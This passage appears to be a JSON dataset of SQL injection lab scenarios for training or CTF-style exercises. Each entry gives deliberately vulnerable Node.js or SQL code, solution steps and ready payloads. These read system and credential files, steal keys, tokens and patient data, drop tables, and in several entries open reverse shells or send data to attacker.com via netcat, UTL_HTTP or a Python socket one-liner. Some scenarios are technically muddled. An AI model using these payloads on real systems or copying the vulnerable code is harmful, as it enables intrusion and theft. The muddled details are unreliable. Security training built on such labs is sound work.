    "srcCode": "app.get('/transactions', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT id, amount, date, recipient, status, currency, user_id\n    FROM transactions\n    ORDER BY ${sort}`;\n\n  pool.query(query, (err, result) => {\n    if(err) {\n      res.status(500).send(`Query failed: ${query}\\n${err.stack}`); // Critical debug leak\n    } else {\n      res.json(result.rows);\n    }\n  });\n});",
    "payloads": [
      "date UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL,NULL,NULL,NULL,NULL--",
      "amount UNION SELECT NULL,current_setting('data_directory'),NULL,NULL,NULL,NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "Medical Imaging System Error-Based SQLi in DICOM Metadata",
    "Lab Description": "A hospital PACS system improperly handles DICOM metadata fields in MySQL INSERT statements. PatientName tags (0010,0010) containing SQL fragments trigger type conversion errors that leak radiation therapy records through verbose database exceptions. Attackers can exfiltrate treatment plans containing sensitive Protected Health Information (PHI) by manipulating VR (Value Representation) fields.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Craft DICOM file with malformed PatientName: ' OR 1=CAST((SELECT treatment_plan FROM radiation LIMIT 1) AS UNSIGNED)--",
      "2. Upload via DICOM C-STORE protocol",
      "3. Extract treatment details from MySQL error messages",
      "4. Bypass DICOM validation using multi-value delimiters",
      "5. Automate extraction using recursive CTE queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/dicom-upload', (req, res) => {\n  const patientName = extractDICOMTag(req.file, '00100010');\n  const query = `INSERT INTO studies\n    (patient_name, modality, study_date)\n    VALUES ('${patientName.replace(/'/g, \",\")}', 'CT', NOW())`;\n\n  pool.query(query, (err) => {\n    res.send(err ? 'DICOM Error' : 'Upload Success');\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,CONCAT(patient_id,':',treatment_date) FROM radiation--",
      "' AND (SELECT COUNT(*) FROM radiation WHERE dose > 5000)=1--"
    ]
  },
  {
    "Lab scenario": "Blockchain Oracle SQLi with Signature Bypass",
    "Lab Description": "A DeFi price oracle using EIP-712 signatures fails to validate query parameters in PostgreSQL. Attackers can forge signed requests to manipulate token prices through UNION injections in symbol parameterization. Vulnerability arises from improper separation of signing logic and SQL construction.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Reverse engineer EIP-712 type hash from contract ABI",
      "2. Craft UNION payload: 'ETH' UNION SELECT 1500.00 AS price--",
      "3. Generate valid signature using leaked nonce",
      "4. Bypass median calculation through Sybil nodes",
      "5. Execute flash loan arbitrage attacks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/price', (req, res) => {\n  const { symbol, signature } = req.body;\n  const query = `SELECT price FROM ${symbol}_prices\n    WHERE block_number > 15438234`;\n\n  if (!validateSig(signature, query)) return res.status(403);\n  pool.query(query, (err, result) => {\n    res.json({ price: median(result.rows) });\n  });\n});",
    "payloads": [
      "ETH' UNION SELECT 1500.00 WHERE '1'='1'--",
      "BTC' AND (SELECT COUNT(*) FROM nodes)>=3--"
    ]
  },
  {
    "Lab scenario": "Industrial PLC Code Injection via Modbus",
    "Lab Description": "A PLC management interface processes Modbus FC23 messages with unsanitized register values in SQLite. Attackers can overwrite ladder logic through stacked queries containing CODESYS compiler commands. Vulnerability stems from mixing control logic storage with operational telemetry.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture Modbus/TCP traffic using Wireshark",
      "2. Forge register write: '; UPDATE plc_code SET program=readfile('/tmp/backdoor.st')--",
      "3. Bypass CRC using bitwise complement",
      "4. Trigger recompilation via dummy register write",
      "5. Verify backdoor installation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "modbusServer.on('readWriteRegisters', (unit, reg, vals) => {\n  const value = vals.readFloatBE(0);\n  const query = `UPDATE iot_registers\n    SET value = ${value}\n    WHERE unit = ${unit} AND reg = ${reg}`;\n\n  db.run(query);\n});",
    "payloads": [
      "'; INSERT INTO plc_code VALUES ('malicious', x'4d5a')--",
      "'; SELECT load_extension('exploit.dll')--"
    ]
  },
  {
    "Lab scenario": "Telecom SS7 MAP Protocol SQLi",
    "Lab Description": "Mobile core network MAP interface improperly handles IMSI values in Oracle PL/SQL. Attackers can inject UNION payloads in UpdateLocation requests to exfiltrate subscriber SMS contents through SCCP routing bypass. Combines SS7 protocol weaknesses with dynamic SQL execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Spoof MAP UpdateLocation request",
      "2. Inject IMSI: ' UNION SELECT sms_text FROM inbox--",
      "3. Bypass SCCP GT translation",
      "4. Intercept SMS delivery reports",
      "5. Correlate TCAP transactions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "CREATE PROCEDURE update_subscriber (\n  p_imsi VARCHAR2\n) IS\nBEGIN\n  EXECUTE IMMEDIATE 'SELECT msisdn FROM subs WHERE imsi='''||p_imsi||'''';\nEND;",
    "payloads": [
      "' UNION SELECT text FROM sms WHERE rownum=1--",
      "'||UTL_HTTP.REQUEST('http://attacker.com/'||location)--"
    ]
  },
  {
    "Lab scenario": "Smart Contract Metadata SQLi",
    "Lab Description": "NFT marketplace processes ERC-721 metadata with vulnerable JSONB queries in PostgreSQL. Attackers exploit JSON concatenation precedence to exfiltrate wallet keys through corrupted rarity scores. Vulnerability combines JSON operator precedence with lack of parameterization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Mint NFT with malicious description",
      "2. Trigger rarity calculation job",
      "3. Exploit JSONB || operator precedence",
      "4. Extract hex-encoded private keys",
      "5. Convert to Ethereum addresses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/calculate-rarity', (req, res) => {\n  const tokenId = req.body.id;\n  const query = `SELECT metadata->>'description' AS desc\n    FROM nfts WHERE token_id = ${tokenId}`;\n\n  pool.query(query, (err, result) => {\n    // Calculate rarity score\n  });\n});",
    "payloads": [
      "{\"description\":\"'||(SELECT ENCODE(private_key,'hex') FROM wallets)--\"}",
      "{\"attributes\":[{\"value\":\"'||(SELECT version())--\"}]}"
    ]
  },
  {
    "Lab scenario": "Drone Navigation SQLi via MAVLink",
    "Lab Description": "UAV ground control system processes MAVLink mission items with unsanitized parameters. Attackers inject coordinate updates through stacked queries to modify flight paths. Vulnerability stems from mixing navigation data storage with real-time control.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Spoof MAVLink system ID",
      "2. Forge MISSION_ITEM packet",
      "3. Bypass CRC via bitwise complement",
      "4. Override geofence coordinates",
      "5. Verify GPS spoofing"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "mavlinkServer.on('missionItem', (msg) => {\n  const query = `INSERT INTO flight_plan\n    (lat, lon) VALUES (${msg.x}, ${msg.y})`;\n  db.run(query);\n});",
    "payloads": [
      "35.6895); UPDATE waypoints SET lat=139.6917--",
      "0; ATTACH DATABASE '/dev/mem' AS mem--"
    ]
  },
  {
    "Lab scenario": "Quantum Circuit SQLi in QASM",
    "Lab Description": "Quantum compiler processes OpenQASM files with vulnerable creg names. Attackers inject SQL payloads to exfiltrate IBMQ credentials through transpilation errors. Combines quantum programming syntax with traditional SQLi.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft QASM with malicious creg",
      "2. Submit via Qiskit API",
      "3. Extract API keys from logs",
      "4. Bypass Unicode validation",
      "5. Hijack quantum compute time"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "def transpile(qasm):\n  name = extract_creg(qasm)\n  query = f\"SELECT mapping FROM layouts WHERE name='{name}'\"\n  db.execute(query);",
    "payloads": [
      "creg inject[8] = \"' UNION SELECT key FROM credentials--\"",
      "opaque gate \u200B' OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Healthcare Radiology SQLi",
    "Lab Description": "Medical imaging system stores radiology notes in PostgreSQL with vulnerable plv8 functions. Attackers chain SQLi with JavaScript execution to leak DICOM files. Combines improper output encoding with excessive DB privileges.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Update notes with base64 payload",
      "2. Trigger report generation",
      "3. Exploit plv8.fetch()",
      "4. Bypass CSP via COPY PROGRAM",
      "5. Reconstruct DICOM files"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/save-notes', (req, res) => {\n  const notes = req.body.notes;\n  const query = `UPDATE reports SET notes='${notes}'\n    WHERE id=${req.params.id}`;\n\n  pool.query(query);\n});",
    "payloads": [
      "'; CREATE TEMP TABLE exfil AS SELECT encode(dicom,'base64') FROM images--",
      "'\\u0027; COPY (SELECT * FROM patients) TO PROGRAM 'nc attacker.com 4444'--"
    ]
  },
  {
    "Lab scenario": "Vehicle CAN Bus SQLi",
    "Lab Description": "Telematics system processes J1939 messages with unsanitized PIDs in SQLite. Attackers forge OBD-II packets to overwrite firmware hashes. Vulnerability arises from mixing diagnostic data with update logic.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture CAN traffic",
      "2. Forge J1939 message",
      "3. Overflow firmware buffer",
      "4. Bypass checksum",
      "5. Trigger malicious update"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "canBus.on('message', (msg) => {\n  const pid = msg.id.toString(16);\n  const query = `INSERT INTO can_logs\n    (pid, data) VALUES ('${pid}', '${msg.data}')`;\n  db.run(query);\n});",
    "payloads": [
      "7DF UNION SELECT NULL,hex(readfile('/etc/passwd'))--",
      "7E0; ATTACH DATABASE '/dev/mmcblk0' AS disk--"
    ]
  },
  {
    "Lab scenario": "DAO Governance SQLi",
    "Lab Description": "Decentralized organization uses vulnerable JSONB queries for Snapshot voting. Attackers manipulate delegation power through ENS record injections. Combines Web3 technologies with traditional SQLi.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Set malicious ENS text record",
      "2. Trigger strategy recalculation",
      "3. Exploit jsonb_to_recordset()",
      "4. Bypass EIP-712 validation",
      "5. Pass malicious proposals"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/voting-power', (req, res) => {\n  const query = `SELECT (metadata->'delegation')::jsonb\n    FROM ens WHERE name='${req.body.delegate}'`;\n  pool.query(query);\n});",
    "payloads": [
      "' OR 1=1; UPDATE voters SET weight=1000--",
      "'))); SELECT pg_sleep(10)--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Product Filter SQL Injection via JSON Parameter",
    "Lab Description": "An e-commerce platform's product filtering API accepts JSON-formatted filter parameters that are directly concatenated into SQL WHERE clauses. The Node.js backend fails to validate array types, allowing attackers to bypass input sanitization and execute UNION-based injections. The PostgreSQL database returns full query errors in production, leaking column structures. To solve: Extract SHA-256 hashed admin credentials and credit card tokenization keys from the payment_gateway_config table while evading WAF rules using Unicode-encoded quotes.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /api/filter-products request with Burp Suite",
      "Modify JSON payload: {\"price\": [\"0'\\u0020UNION\\u0020SELECT\\u0020NULL,key::text,NULL\\u0020FROM\\u0020payment_gateway_config--\"]}",
      "Bypass WAF using \\u0020 for whitespace and \\u0027 for apostrophes",
      "Identify VARCHAR-compatible columns through error analysis",
      "Decode Base64-encoded responses containing encrypted keys"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/filter-products', (req, res) => {\n  const filters = req.body\n    .map(f => `${f.field} = '${f.value}'`)\n    .join(' AND ');\n  const query = `SELECT id,name,price FROM products WHERE ${filters}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(`Error: ${err.message}\\nQuery: ${query}`);\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "{\"field\":\"price\",\"value\":\"0'\\u0020UNION\\u0020SELECT\\u00201,version(),3--\"}",
      "{\"field\":\"category\",\"value\":\"electronics'\\u0020AND\\u00201=CAST((SELECT\\u0020COUNT(*)\\u0020FROM\\u0020payment_gateway_config)\\u0020AS\\u0020INTEGER)--\"}"
    ]
  },
  {
    "Lab scenario": "Healthcare Patient Portal Boolean-Based Blind SQLi",
    "Lab Description": "A hospital patient portal uses unsanitized input in medication lookup queries. The Oracle backend suppresses errors but returns HTTP 200/404 status codes based on query validity. To solve: Determine sensitive patient allergy records through bitwise binary search of ASCII values using DBMS_PIPE packaged functions. The challenge requires precise timing analysis and evasion of request throttling mechanisms.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture POST /get-medications request with OWASP ZAP",
      "Identify boolean trigger: ' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
      "Automate with sqlmap custom script using --eval=\"import base64\"",
      "Correlate response delays with SUBSTR(allergy_info,1,1)='A' conditions",
      "Reconstruct full medical history from 15,000+ possible combinations"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/get-medications', (req, res) => {\n  const patientId = req.body.id;\n  const query = `SELECT drug_name FROM prescriptions WHERE patient_id='${patientId}'`;\n  \n  oracle.execute(query, (err, result) => {\n    res.status(result.rows.length > 0 ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "' OR (SELECT BITAND(ASCII(SUBSTR(allergy_info,1,1)),128)=128--",
      "' AND (SELECT LENGTH(ssn) FROM patients WHERE id=1)=9--"
    ]
  },
  {
    "Lab scenario": "IoT Device Management UNION-Based SQLi in API Endpoint",
    "Lab Description": "An industrial IoT dashboard constructs SQL queries using unsanitized device IDs from REST parameters. The MySQL backend allows stacked queries but blocks UNION unless column counts match exactly. To solve: Extract AWS IoT Core certificates by forcing JSON type coercion through CONCAT(0x7b,private_key) and bypassing TLS fingerprint validation in the management API.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /devices/12345/status request",
      "Modify path parameter: /devices/12345' UNION SELECT NULL,CONCAT('{\"key\":\"',private_key,'\"}') FROM iot_certs--/status",
      "Handle JSON parsing errors through charset manipulation",
      "Convert hex-encoded results to PEM format",
      "Validate certificates against AWS IoT endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/devices/:id/status', (req, res) => {\n  const deviceId = req.params.id;\n  const query = `SELECT status, timestamp FROM devices WHERE id='${deviceId}'`;\n  \n  pool.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,LOAD_FILE('/etc/iot/config.json')--",
      "' AND SLEEP(IF(ASCII(SUBSTR(private_key,1,1))>100,5,0))--"
    ]
  },
  {
    "Lab scenario": "Social Media Platform Error-Based SQLi in Comment Section",
    "Lab Description": "A social media platform's comment moderation system directly interpolates user input into DELETE statements. The Microsoft SQL Server leaks full query plans through verbose errors when invalid type conversions occur. To solve: Exfiltrate OAuth tokens and DM conversations by forcing arithmetic overflow errors in XML PATH queries containing secret data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post comment: '); DELETE FROM comments WHERE 1=CAST((SELECT TOP 1 token FROM oauth_tokens) AS INT)--",
      "Analyze error message containing truncated OAuth token",
      "Use FOR XML PATH to concatenate full tokens",
      "Bypass CSP protections using ADODB.Stream object",
      "Automate token extraction using error differential analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/comments/:id', (req, res) => {\n  const commentId = req.params.id;\n  const query = `DELETE FROM comments WHERE id='${commentId}'`;\n  \n  mssql.query(query, (err) => {\n    if(err) res.status(500).send(err.message);\n    else res.send('Comment removed');\n  });\n});",
    "payloads": [
      "'); BEGIN TRY SELECT CONVERT(INT, (SELECT token FROM oauth_tokens)) END TRY BEGIN CATCH SELECT ERROR_MESSAGE() END CATCH--",
      "'); SELECT 1/0 FROM OPENROWSET(BULK '\\attacker.com\\exfil', SINGLE_BLOB)--"
    ]
  },
  {
    "Lab scenario": "Banking Application Second-Order SQLi in User Registration",
    "Lab Description": "A neo-banking app stores unsanitized occupation fields that get used in nightly KYC report generation. The PostgreSQL cron job runs with elevated privileges, allowing attackers to overwrite audit logs. To solve: Poison user profiles with CTE expressions containing pg_cancel_backend() and COPY TO PROGRAM calls to establish reverse shells through delayed job execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register with occupation: '); CREATE TEMP TABLE exfil AS SELECT * FROM wire_transfers--",
      "Wait 23:00 UTC for report generation trigger",
      "Monitor netcat listener for database dumps",
      "Escalate privileges using SECURITY DEFINER functions",
      "Cover tracks using VACUUM FULL and log rotation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const occupation = req.body.occupation;\n  const query = `INSERT INTO users (occupation) VALUES ('${occupation}')`;\n  \n  pool.query(query, () => {\n    res.send('Account pending review');\n  });\n});",
    "payloads": [
      "'); SELECT pg_sleep(10); COPY users TO PROGRAM 'nc attacker.com 4444'--",
      "'); CREATE SERVER exfil FOREIGN DATA WRAPPER file_fdw--"
    ]
  },
  {
    "Lab scenario": "Educational Platform Time-Based SQLi in Course Enrollment",
    "Lab Description": "A university course enrollment system uses unsanitized student IDs in SQLite queries. The system returns identical error pages but allows time-based inference through randomblob() function calls. To solve: Extract exam answers and grade curves by measuring response delays when querying encrypted BLOB columns in the course_materials table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /enroll request with student_id parameter",
      "Inject: ' OR CASE WHEN (SELECT hex(substr(answer,1,1))='41' THEN randomblob(100000000) ELSE 0 END--",
      "Use Python requests with 0.1-second timing precision",
      "Brute-force AES-encrypted answers using known IV patterns",
      "Decrypt results using leaked course API keys"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/enroll', (req, res) => {\n  const studentId = req.body.student_id;\n  const query = `SELECT * FROM courses WHERE student_id='${studentId}'`;\n  \n  db.all(query, (err, rows) => {\n    res.send(rows.length > 0 ? 'Enrolled' : 'Invalid ID');\n  });\n});",
    "payloads": [
      "' OR (SELECT LENGTH(answer) FROM course_materials)=500 AND randomblob(100000000)--",
      "' AND 1=CAST((SELECT COUNT(*) FROM sqlite_master WHERE sql LIKE '%answer%') AS INTEGER)--"
    ]
  },
  {
    "Lab scenario": "Government Portal UNION SQLi in Document Search",
    "Lab Description": "A classified document search portal concatenates user input into ORDER BY clauses of Oracle queries. The application uses APEX authentication but leaks execution plans through utl_http calls. To solve: Exfiltrate nuclear facility blueprints by bypassing ORA-00904 errors through OUTER JOIN payloads and converting BFILEs to Base64-encoded strings in UNION SELECT clauses.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GET /search?sort=date request",
      "Inject: date UNION SELECT NULL,utl_raw.cast_to_varchar2(utl_encode.base64_encode(bfilename('CLASSIFIED_DIR',file_name))) FROM blueprints--",
      "Bypass TNS listener encryption using SQL*Net bypass",
      "Reconstruct PDFs from chunked Base64 responses",
      "Circumvent Data Redaction policies through XMLType extraction"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const sort = req.query.sort || 'date';\n  const query = `SELECT doc_id, title FROM documents ORDER BY ${sort}`;\n  \n  oracle.execute(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "date UNION SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA'), NULL FROM DUAL--",
      "title UNION SELECT (SELECT XMLAGG(XMLELEMENT(e, text)).getClobVal() FROM redacted_docs), NULL--"
    ]
  },
  {
    "Lab scenario": "Logistics Management System Stacked Queries via CSV Export",
    "Lab Description": "A freight tracking system's CSV export feature uses unsanitized input in COPY TO statements. Attackers can execute OS commands through PostgreSQL's COPY FROM PROGRAM and create reverse shells using Python subprocesses encoded in hex. The vulnerability is compounded by the application running as root with NOPASSWD sudo privileges.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GET /export?filter=1",
      "Inject: 1); COPY shipments FROM PROGRAM 'python3 -c \\'import socket,subprocess,os;s=socket.socket();s.connect(\\\"attacker.com\\\",443);[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(\\\"/bin/sh\\\")\\''--",
      "Monitor reverse shell connections",
      "Escalate privileges using sudo -l misconfigurations",
      "Dump entire shipment database using pg_dump"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export', (req, res) => {\n  const filter = req.query.filter;\n  const query = `COPY (SELECT * FROM shipments WHERE ${filter}) TO STDOUT CSV`;\n  \n  pool.query(query, (err) => {\n    res.attachment('export.csv');\n  });\n});",
    "payloads": [
      "1); CREATE TABLE pwn AS SELECT * FROM pg_user--",
      "0; DROP TABLE IF EXISTS audit_logs CASCADE--"
    ]
  },
  {
    "Lab scenario": "Telemedicine App JWT-Triggered SQLi in Patient Records",
    "Lab Description": "A HIPAA-compliant telemedicine platform embeds JWT claims in SQL WHERE clauses without validation. Attackers can forge tokens with UNION payloads containing XPath expressions to extract radiology images stored as PostgreSQL BYTEA. The challenge requires bypassing Content Security Policies and reconstructing DICOM files from hex-encoded binary chunks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using HS256 brute-force",
      "Modify sub claim: ' UNION SELECT encode(image_data,'hex'), current_setting('data_directory') FROM scans--",
      "Bypass CORS restrictions using credentialed fetch()",
      "Reassemble DICOM files using Python bitarray",
      "Validate images with Orthanc DICOM viewer"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/patient-records', (req, res) => {\n  const patientId = jwtVerify(req.cookies.token).sub;\n  const query = `SELECT * FROM records WHERE patient_id='${patientId}'`;\n  \n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,pg_read_file('/etc/passwd')--",
      "'||(SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END)--"
    ]
  },
  {
    "Lab scenario": "Cloud Storage API SQL Injection via Metadata Field",
    "Lab Description": "A cloud storage service processes file metadata using vulnerable JSONB path queries in PostgreSQL. Attackers can exploit jsonb_set() function to overwrite IAM policies and exfiltrate S3 pre-signed URLs through malformed JSON responses containing UNION-injected bucket permissions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload file with metadata: {\"tags\": \"'||(SELECT jsonb_set(config,'{policy}','\"admin\"'::jsonb) FROM buckets)--\"}",
      "Trigger metadata processing cron job",
      "Extract pre-signed URLs from AWS SDK errors",
      "Bypass bucket policies using modified IAM roles",
      "Exfiltrate data using curl with stolen URLs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/upload', (req, res) => {\n  const metadata = req.body.metadata;\n  const query = `INSERT INTO files (metadata) VALUES ('${metadata}')`;\n  \n  pool.query(query, (err) => {\n    res.send('File processed');\n  });\n});",
    "payloads": [
      "'||(SELECT encode(convert_to(pg_read_file('/.env'),'base64'))::jsonb--",
      "' WHERE 1=0 UNION SELECT current_setting('aws.keys')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Search Functionality",
    "Lab Description": "The search functionality does not properly sanitize user input, allowing for SQL injection. The application uses user-supplied search terms directly in SQL queries, exposing it to attack. To solve: Inject malicious SQL to retrieve sensitive data or modify the database.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept search request using Burp Suite",
      "Identify vulnerable search input field",
      "Inject SQL payload into the search query: ' OR 1=1--",
      "Retrieve all data from the 'users' table by modifying the query: ' UNION SELECT username, password FROM users--",
      "Extract sensitive data, such as usernames and passwords"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { searchTerm } = req.query;\n  const query = `SELECT * FROM products WHERE name LIKE '%${searchTerm}%'`; \n  db.query(query, (err, results) => {\n    res.render('searchResults', { products: results });\n  });\n});",
    "payloads": [
      "' OR 1=1--",
      "' UNION SELECT username, password FROM users--",
      "'; DROP TABLE products--",
      "' OR 'a'='a"
    ]
  },
  {
    "Lab scenario": "SQL injection in a REST API's product search query",
    "Lab Description": "This lab demonstrates a UNION-based SQL injection vulnerability in a product search query of a REST API. The API takes a product name as a query parameter and executes a direct SQL query without sanitization. To solve the lab, exploit this vulnerability to enumerate the database version.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the API request containing the product name parameter.",
      "2. Perform a basic UNION attack to determine the number of columns being returned by the query using the payload: ' OR 1=1 UNION SELECT NULL, NULL, NULL --",
      "3. Once the number of columns is identified, modify the payload to retrieve the database version using: ' UNION SELECT NULL, version(), NULL --",
      "4. Verify the database version is returned in the response.",
      "5. Exploit further by attempting to extract other sensitive information from the database."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, description TEXT)\");\n  db.run(\"INSERT INTO products (name, description) VALUES ('Product1', 'A test product')\");\n  db.run(\"INSERT INTO products (name, description) VALUES ('Product2', 'Another test product')\");\n});\n\napp.get('/search', (req, res) => {\n  const search = req.query.name || '';\n  const query = `SELECT * FROM products WHERE name = '${search}'`;  // Vulnerability here\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error executing query.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
    "payloads": [
      "' OR 1=1 UNION SELECT NULL, NULL, NULL --",
      "' UNION SELECT NULL, version(), NULL --"
    ]
  },
  {
    "Lab scenario": "Boolean-based blind SQL injection in login form",
    "Lab Description": "This lab demonstrates a boolean-based blind SQL injection vulnerability in a login form. The application uses a vulnerable query that doesn't provide direct error messages but does change the page content based on the result. To solve the lab, infer the administrator's password length using boolean conditions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the login request and modify the parameters.",
      "2. Test for a basic boolean injection by submitting ' OR 1=1 -- to the username parameter and check if login succeeds.",
      "3. Start testing for the length of the administrator's password by submitting ' AND LENGTH(password) > 10 --",
      "4. If true, decrease the number until you identify the exact length of the password.",
      "5. Once the length is found, use substring-based attacks to find each character of the password."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('administrator', 'admin12345')\");\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`; // Vulnerability here\n  db.get(query, [], (err, row) => {\n    if (err) {\n      res.status(500).send(\"Error executing query.\");\n    } else if (row) {\n      res.send('Login successful!');\n    } else {\n      res.send('Login failed.');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
    "payloads": [
      "' OR 1=1 --",
      "' AND LENGTH(password) > 10 --"
    ]
  },
  {
    "Lab scenario": "Time-based SQL injection in account balance query",
    "Lab Description": "This lab demonstrates a time-based SQL injection vulnerability in an account balance query. The application performs a delay in response when an invalid query is executed. To solve the lab, infer the balance of a target account by sending time-delayed SQL injection queries.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept and modify the request that checks for account balance.",
      "2. Test for a delay-based injection by submitting ' OR 1=1 SLEEP(5) -- to the account ID parameter.",
      "3. If the response is delayed by 5 seconds, confirm the presence of time-based SQL injection.",
      "4. Use the SLEEP function to progressively test different account IDs and infer the balance by observing response times.",
      "5. Perform full exploitation to reveal the balance of a specific account."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE accounts (id INTEGER PRIMARY KEY, balance INTEGER)\");\n  db.run(\"INSERT INTO accounts (id, balance) VALUES (1, 1000)\");\n  db.run(\"INSERT INTO accounts (id, balance) VALUES (2, 2000)\");\n});\n\napp.get('/balance', (req, res) => {\n  const id = req.query.id || '';\n  const query = `SELECT balance FROM accounts WHERE id = '${id}'`; // Vulnerability here\n  db.get(query, [], (err, row) => {\n    if (err) {\n      res.status(500).send(\"Error executing query.\");\n    } else {\n      res.json({ balance: row ? row.balance : 'Not Found' });\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
    "payloads": [
      "' OR 1=1 SLEEP(5) --"
    ]
  },
  {
    "Lab scenario": "SQL injection bypassing input filters with case manipulation",
    "Lab Description": "This lab demonstrates a SQL injection vulnerability where input filters only allow certain characters. The application sanitizes input but does not properly handle case differences. To solve the lab, bypass the filter and perform a UNION-based SQL injection attack.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept and modify the request containing the 'username' parameter.",
      "2. Try submitting a basic payload such as ' OR 1=1 -- and observe if the input is blocked.",
      "3. Bypass the filter by submitting ' oR 1=1 -- with case manipulation.",
      "4. Once the filter bypass is successful, perform a UNION attack to enumerate database tables.",
      "5. Verify the attack's success by extracting information from the database."
    ],
    "Vulnerability name": "SQL injection",
